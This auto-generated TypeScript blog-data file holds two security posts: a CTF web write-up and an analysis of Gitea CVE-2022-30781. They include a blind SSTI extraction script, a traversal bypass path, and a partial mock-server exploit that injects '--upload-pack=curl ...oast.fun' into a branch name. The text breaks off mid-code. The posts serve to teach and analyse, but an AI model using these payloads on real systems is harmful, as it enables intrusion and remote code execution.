// This file is auto-generated by the build process
// Do not edit manually - it will be overwritten

export interface BlogPost {
  slug: string
  title: string
  date: string
  excerpt: string
  content: string
  tags: string[]
  author: string
}

export const blogPosts: BlogPost[] = [
  {
    "slug": "2025-04-28-cit-ctf",
    "title": "[CIT CTF 2025] Solving all Web challenges",
    "date": "2025-04-28",
    "excerpt": "Complete writeup for all web challenges from CIT CTF 2025, including SSTI exploitation, LFI bypasses, git repository enumeration, and SQL injection techniques.",
    "content": "<p>Hello, I joined the CTF for fun during the weekend.</p>\n<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>\n<h2>Mr. Chatbot</h2>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png\" alt=\"Mr. Chatbot Challenge\"></p>\n<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn't an LLM attack — responses came from JavaScript files.</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png\" alt=\"Chat Interface\"></p>\n<p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>\n<div class=\"remark-highlight\"><pre class=\"language-bash\"><code class=\"language-bash\">$ flask-unsign <span class=\"token parameter variable\">--unsign</span> <span class=\"token parameter variable\">--cookie</span> <span class=\"token string\">\"eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk\"</span> <span class=\"token parameter variable\">--secret</span><span class=\"token operator\">=</span><span class=\"token string\">\"9f3IC3uj9^zZ\"</span>\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Session decodes to: <span class=\"token punctuation\">{</span><span class=\"token string\">'admin'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'0'</span>, <span class=\"token string\">'name'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'hacker'</span><span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png\" alt=\"Session Decoding\"></p>\n<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png\" alt=\"Admin Parameter\"></p>\n<div class=\"remark-highlight\"><pre class=\"language-bash\"><code class=\"language-bash\">$ flask-unsign <span class=\"token parameter variable\">--unsign</span> <span class=\"token parameter variable\">--cookie</span> <span class=\"token string\">\".eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM\"</span> <span class=\"token parameter variable\">--secret</span><span class=\"token operator\">=</span><span class=\"token string\">\"9f3IC3uj9^zZ\"</span>\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Session decodes to: <span class=\"token punctuation\">{</span><span class=\"token string\">'admin'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'1'</span>, <span class=\"token string\">'name'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"hacker\"</span>, <span class=\"token string\">'uid'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs='</span><span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p>As you see there's a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png\" alt=\"SSTI Success\"></p>\n<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> time\n\nCHARS <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable\nFOUND <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nPOSITION <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>FOUND<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">make_payload</span><span class=\"token punctuation\">(</span>position<span class=\"token punctuation\">,</span> the_char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># Use a simple command to compare single character</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'[ \"$(head -c </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>position<span class=\"token punctuation\">}</span></span><span class=\"token string\"> secrets.txt | tail -c 1)\" = \"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>the_char<span class=\"token punctuation\">}</span></span><span class=\"token string\">\" ] &#x26;&#x26; sleep 5'</span></span>\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">\"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('\"</span><span class=\"token operator\">+</span>cmd<span class=\"token operator\">+</span><span class=\"token string\">\"').read() }}\"</span>\n    <span class=\"token keyword\">return</span> payload\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> FOUND<span class=\"token punctuation\">,</span> POSITION\n    \n    <span class=\"token comment\"># Continue until we've found enough characters or need to stop</span>\n    max_positions <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\"># Set a reasonable limit</span>\n    consecutive_spaces <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># Track consecutive spaces to detect end of file</span>\n    \n    <span class=\"token keyword\">while</span> POSITION <span class=\"token operator\">&#x3C;=</span> max_positions <span class=\"token keyword\">and</span> consecutive_spaces <span class=\"token operator\">&#x3C;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># Stop after 5 consecutive spaces</span>\n        found_char <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n        \n        <span class=\"token keyword\">for</span> ch <span class=\"token keyword\">in</span> CHARS<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> ch <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'$'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&#x26;'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'|'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">';'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># Skip problematic chars</span>\n                <span class=\"token keyword\">continue</span>\n                \n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Position </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\">, trying character: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>ch<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            \n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n                    <span class=\"token string\">\"http://23.179.17.40:58005/\"</span><span class=\"token punctuation\">,</span> \n                    allow_redirects<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> \n                    data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> make_payload<span class=\"token punctuation\">(</span>POSITION<span class=\"token punctuation\">,</span> ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    proxies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"http\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://localhost:8080\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    timeout<span class=\"token operator\">=</span><span class=\"token number\">10</span>\n                <span class=\"token punctuation\">)</span>\n                \n                elapsed_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start_time\n                \n                <span class=\"token keyword\">if</span> elapsed_time <span class=\"token operator\">>=</span> <span class=\"token number\">4.5</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># Slightly lower threshold to account for network variability</span>\n                    FOUND <span class=\"token operator\">+=</span> ch\n                    found_char <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n                    \n                    <span class=\"token comment\"># Reset consecutive spaces counter if we found a non-space</span>\n                    <span class=\"token keyword\">if</span> ch <span class=\"token operator\">!=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">:</span>\n                        consecutive_spaces <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n                    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                        consecutive_spaces <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n                        \n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Found character at position </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>ch<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Current secret: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>FOUND<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">break</span>\n                    \n            <span class=\"token keyword\">except</span> requests<span class=\"token punctuation\">.</span>exceptions<span class=\"token punctuation\">.</span>Timeout<span class=\"token punctuation\">:</span>\n                <span class=\"token comment\"># If timeout occurs, the character matched</span>\n                FOUND <span class=\"token operator\">+=</span> ch\n                found_char <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n                \n                <span class=\"token comment\"># Reset consecutive spaces counter if we found a non-space</span>\n                <span class=\"token keyword\">if</span> ch <span class=\"token operator\">!=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">:</span>\n                    consecutive_spaces <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    consecutive_spaces <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n                    \n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Found character at position </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\"> (timeout): </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>ch<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Current secret: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>FOUND<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n                \n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Error with character </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>ch<span class=\"token punctuation\">}</span></span><span class=\"token string\"> at position </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>e<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> found_char<span class=\"token punctuation\">:</span>\n            FOUND <span class=\"token operator\">+=</span> <span class=\"token string\">\" \"</span>\n            consecutive_spaces <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"No character found at position </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\">, adding space and continuing\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Current secret: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>FOUND<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Consecutive spaces: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>consecutive_spaces<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        \n        POSITION <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        \n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Starting blind exploitation from existing credentials: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>FOUND<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Starting at position: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>POSITION<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    exploit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Final extracted secret: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>FOUND<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>And after running it got the flag :)</p>\n<div class=\"remark-highlight\"><pre class=\"language-bash\"><code class=\"language-bash\">$ python exp.py\nadmin:9f3IC3uj9^zZ  CIT<span class=\"token punctuation\">{</span>18a7fbedb4f3548f<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<h2>How I Parsed your JSON</h2>\n<p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>\n<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png\" alt=\"Debug Page\"></p>\n<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>\n<div class=\"remark-highlight\"><pre class=\"language-unknown\"><code class=\"language-unknown\">/select?record=*&#x26;amp;container=../../../..//app//secrets.txt.txt</code></pre></div>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png\" alt=\"LFI Bypass Result\"></p>\n<h2>Commit &#x26; Order: Version Control Unit</h2>\n<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>\n<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>\n<p>The steps to solve were:</p>\n<ol>\n<li>Identify the exposed Git repository at <code>/.git</code></li>\n<li>Download the repository using git-dump</li>\n<li>Review commit history with <code>git log</code></li>\n<li>Check older commits with <code>git show [commit-hash]</code></li>\n<li>Find the source code file containing the hardcoded admin password in admin.php</li>\n<li>Use the credentials to access the admin panel and retrieve the flag</li>\n</ol>\n<h2>Breaking Authentication</h2>\n<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>\n<p>Steps to solve:</p>\n<ol>\n<li>Accessed the database and dumped its contents</li>\n<li>Found the flag stored in the 'secrets' table</li>\n</ol>\n<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application's authentication mechanism.</p>\n<h2>Keeping Up with the Credentials</h2>\n<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>\n<p>Steps to solve:</p>\n<ol>\n<li>Used credentials obtained from the previous challenge to log in</li>\n<li>After login, got redirected to <code>/debug.php</code> which was an empty page</li>\n<li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li>\n<li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li>\n<li>Successfully redirected to <code>/admin.php</code> with admin privileges</li>\n<li>Retrieved the flag from the admin page</li>\n</ol>\n<p>Pretty Simple :v</p>\n",
    "tags": [
      "CTF",
      "web security",
      "SSTI",
      "LFI",
      "SQL injection",
      "git enumeration",
      "flask"
    ],
    "author": "MindPatch"
  },
  {
    "slug": "2024-01-10-Analysis-Of-CVE-2022–30781",
    "title": "Analysis of CVE-2022–30781",
    "date": "2025-04-10",
    "excerpt": "How Git Fetch Resulted in Critical Remote Code Execution in Gitea.",
    "content": "<hr>\n<p>How Git Fetch Resulted in Critical Remote Code Execution in Gitea</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:477/0*7XgQCsp0nd9dRoQo.png\" alt=\"\"></p>\n<p><strong>Good Morning, Everyone!</strong></p>\n<p>In today’s post, I’ll dive into an analysis of  <strong>CVE-2022–30781</strong>, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.</p>\n<p>Here’s what we’ll cover:</p>\n<ol>\n<li><strong>Understanding How the CVE Works</strong></li>\n<li><strong>Writing Our Own Exploit</strong></li>\n<li><strong>How the Gitea Team Fixed It</strong></li>\n</ol>\n<p>Let’s jump in and enjoy</p>\n<h2>Import your Git repo here</h2>\n<p>in every git platform like gitea, it has a feature that allows you to import all your repo from another platform or different git server into your platform in single click which called  <strong>Migration</strong></p>\n<p>but beside .git repo it's also provides some other options to</p>\n<ul>\n<li>pull requests</li>\n<li>Wiki page</li>\n<li>issues</li>\n</ul>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:610/1*WbwcS7_bkRCKzFRpqfbAGQ.png\" alt=\"\"></p>\n<p>and in order to extract these data gitea communicate with the chosen platform API in order to import this data</p>\n<p>and in one of these options is migrate a repo from another gitea server, and by choosing this option you can notice in logs a few requests from gitea for these endpoints</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:1000/1*L1GbLaJQJ5ci-rF6n69WCg.png\" alt=\"\"></p>\n<p>and one of these endpoints returns the repo pull requests information including the pull request branch, and then gitea will fetch this branch using  <code>$ git fetch &#x3C;remote> &#x3C;branch></code></p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:1000/1*_NpVmALCvNOrfyiALbmzUA.png\" alt=\"\"></p>\n<p>and as you can see, we cannot Espace using whitespace here in order to get that RCE</p>\n<h2>Fetch options</h2>\n<p>The Fetch git subcommand has a few different options you can find here (<a href=\"https://git-scm.com/docs/git-fetch\">Git — git-fetch Documentation</a>)</p>\n<p>and the interesting one here is  <strong>— upload-pack</strong> option</p>\n<blockquote>\n<p>— upload-pack <upload-pack></p>\n<p>When given, and the repository to fetch from is handled by  <strong>git fetch-pack</strong>,  <code>--exec=&#x3C;upload-pack></code>  is passed to the command to specify non-default path for the command run on the other end.</p>\n</blockquote>\n<p>So, Using this option lets us change the default path of the  <code>git-upload-pack</code>  tool. This can potentially lead to Remote Code Execution (RCE).</p>\n<p>To exploit this, we could inject  <code>--upload-pack='CMD'</code>  into a branch name or a remote repository. However, Git itself doesn’t allow this directly. 😞</p>\n<p>But as mentioned earlier, Gitea servers use APIs to fetch repository information. So, we can set up a mock server to return fake data. When the server asks for the pull request branch, we can include the  <code>--upload-pack</code>  option in the response and check if it gets executed</p>\n<h2>Writing The Exploit</h2>\n<p>In writing the exploit process I always chose python as its the fastest and painless option for me, but you can pick what you like</p>\n<p>lets go write our exploit, and this one requires us first to see what gitea api client expect the response so we make sure it gets parsed right</p>\n<p>and this step can be done easily after analysing the gitea Swagger file, and after review it I came up with this simple API written in FastAPI</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> fastapi <span class=\"token keyword\">import</span> APIRouter  \n  \nrouter <span class=\"token operator\">=</span> APIRouter<span class=\"token punctuation\">(</span>prefix<span class=\"token operator\">=</span><span class=\"token string\">\"/api/v1\"</span><span class=\"token punctuation\">)</span>  \nRCE_PAYLOAD <span class=\"token operator\">=</span> <span class=\"token string\">\"curl ID.oast.fun\"</span>  \n  \n  \n<span class=\"token comment\"># Mock data for some endpoints  </span>\nMAX_RESPONSE_ITEMS <span class=\"token operator\">=</span> <span class=\"token number\">50</span>  \nDEFAULT_PAGING_NUM <span class=\"token operator\">=</span> <span class=\"token number\">30</span>  \nDEFAULT_GIT_TREES_PER_PAGE <span class=\"token operator\">=</span> <span class=\"token number\">1000</span>  \nDEFAULT_MAX_BLOB_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">10485760</span>  \nfull_uri <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:3000/\"</span>  \n  \n<span class=\"token decorator annotation punctuation\">@router<span class=\"token punctuation\">.</span>get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/version\"</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">get_version</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1.16.6\"</span><span class=\"token punctuation\">}</span>  \n  \n<span class=\"token decorator annotation punctuation\">@router<span class=\"token punctuation\">.</span>get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/settings/api\"</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">get_settings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>  \n        <span class=\"token string\">\"max_response_items\"</span><span class=\"token punctuation\">:</span> MAX_RESPONSE_ITEMS<span class=\"token punctuation\">,</span>  \n        <span class=\"token string\">\"default_paging_num\"</span><span class=\"token punctuation\">:</span> DEFAULT_PAGING_NUM<span class=\"token punctuation\">,</span>  \n        <span class=\"token string\">\"default_git_trees_per_page\"</span><span class=\"token punctuation\">:</span> DEFAULT_GIT_TREES_PER_PAGE<span class=\"token punctuation\">,</span>  \n        <span class=\"token string\">\"default_max_blob_size\"</span><span class=\"token punctuation\">:</span> DEFAULT_MAX_BLOB_SIZE<span class=\"token punctuation\">,</span>  \n    <span class=\"token punctuation\">}</span>  \n  \n<span class=\"token decorator annotation punctuation\">@router<span class=\"token punctuation\">.</span>get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/repos/{owner}/{repo}\"</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">get_repo_info</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> repo<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token triple-quoted-string string\">\"\"\"  </span>\n<span class=\"token triple-quoted-string string\">    Returns repository information for a given owner and repo.  </span>\n<span class=\"token triple-quoted-string string\">    \"\"\"</span>  \n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>  \n        <span class=\"token string\">\"clone_url\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>full_uri<span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>owner<span class=\"token punctuation\">}</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>repo<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">,</span>  \n        <span class=\"token string\">\"owner\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"login\"</span><span class=\"token punctuation\">:</span> owner<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n    <span class=\"token punctuation\">}</span>  \n  \n<span class=\"token decorator annotation punctuation\">@router<span class=\"token punctuation\">.</span>get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/repos/{owner}/{repo}/topics\"</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">get_repo_topics</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> repo<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"topics\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>  \n  \n<span class=\"token decorator annotation punctuation\">@router<span class=\"token punctuation\">.</span>get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/repos/{owner}/{repo}/pulls\"</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">get_repo_pulls</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> repo<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token triple-quoted-string string\">\"\"\"  </span>\n<span class=\"token triple-quoted-string string\">    Returns pull requests for a given repository.  </span>\n<span class=\"token triple-quoted-string string\">    \"\"\"</span>  \n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>  \n        <span class=\"token punctuation\">{</span>  \n            <span class=\"token string\">\"base\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"ref\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"master\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n            <span class=\"token string\">\"head\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>  \n                <span class=\"token string\">\"ref\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"--upload-pack=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>RCE_PAYLOAD<span class=\"token punctuation\">}</span></span><span class=\"token 